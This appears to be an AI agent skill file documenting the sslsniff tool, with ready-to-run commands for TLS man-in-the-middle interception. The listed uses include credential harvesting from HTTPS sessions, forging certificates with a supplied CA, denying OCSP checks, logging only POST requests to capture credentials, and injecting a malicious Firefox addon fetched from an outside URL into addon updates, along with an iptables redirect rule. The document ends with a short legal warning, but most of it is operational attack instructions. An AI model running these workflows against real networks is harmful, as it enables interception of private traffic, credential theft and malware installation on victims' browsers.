name: sslsniff
description: Perform SSL/TLS man-in-the-middle (MITM) attacks by dynamically generating certificates for accessed domains on the fly. Use when intercepting encrypted traffic, performing credential harvesting from HTTPS sessions, or testing SSL/TLS implementations for vulnerabilities like null-prefix or OCSP bypass. Suitable for Sniffing & Spoofing and Web Application Testing domains.

# sslsniff

## Overview
sslsniff is a tool designed to facilitate man-in-the-middle (MITM) attacks against SSL/TLS connections. It dynamically generates certificates for requested domains, signed by a provided CA certificate. It supports advanced techniques such as null-prefix attacks, OCSP request denial, and targeted browser fingerprinting to achieve silent interception. Category: Sniffing & Spoofing / Web Application Testing.

## Installation (if not already installed)
Assume sslsniff is already installed. If the command is missing:

```bash
sudo apt install sslsniff
```

## Common Workflows

### Authority Mode (General MITM)
Intercept all SSL traffic using a specific CA certificate and key. This requires the victim to trust the provided CA.
```bash
sslsniff -a -c /path/to/ca.pem -s 8443 -w logfile.txt
```

### Targeted Mode
Use a directory of certificates to target specific domains or known vulnerable certificates.
```bash
sslsniff -t -c /path/to/certs/ -s 8443 -w logfile.txt
```

### Browser-Specific Interception
Only intercept traffic coming from Internet Explorer and Firefox, while ignoring others.
```bash
sslsniff -a -c ca.pem -s 8443 -w logfile.txt -f ff,ie
```

### Mozilla Addon Injection
Intercept Mozilla addon updates and inject a custom addon (requires the SHA256 of the new addon).
```bash
sslsniff -a -c ca.pem -s 8443 -w logfile.txt -e http://example.com/malicious.xpi -j <sha256_hash>
```

```
Usage: sslsniff [options]
```

### Modes
| Flag | Description |
|------|-------------|
| `-a` | **Authority mode**: Specify a certificate that will act as a CA to sign forged certificates. |
| `-t` | **Targeted mode**: Specify a directory full of certificates to target specific hosts. |

### Required Options
| Flag | Description |
|------|-------------|
| `-c <file\|directory>` | File containing CA cert/key (for authority mode) OR directory containing a collection of certs/keys (for targeted mode). |
| `-s <port>` | Port to listen on for SSL interception (traffic must be redirected here via iptables). |
| `-w <file>` | File to log intercepted data and headers to. |

### Optional Options
| Flag | Description |
|------|-------------|
| `-u <updateLocation>` | Location of any Firefox XML update files. |
| `-m <certificateChain>` | Location of any intermediary certificates to be included in the forged chain. |
| `-h <port>` | Port to listen on for HTTP interception (required for browser fingerprinting). |
| `-f <ff,ie,safari,opera,ios>` | Only intercept requests from the specified browser(s). Comma-separated list. |
| `-d` | Deny OCSP requests for the certificates generated by the tool. |
| `-p` | Only log HTTP POST requests (useful for focusing on credentials). |
| `-e <url>` | Intercept Mozilla Addon Updates and redirect to the specified URL. |
| `-j <sha256>` | The sha256sum value of the addon to inject (used with `-e`). |

## Notes
- **Traffic Redirection**: Before running `sslsniff`, you must redirect traffic to the listening port using `iptables`. For example:
  `iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443`
- **Fingerprinting**: If using the `-f` flag to target specific browsers, you must also provide an HTTP interception port with `-h`.
- **Legal Warning**: This tool is for authorized security testing and educational purposes only. Unauthorised interception of traffic is illegal.
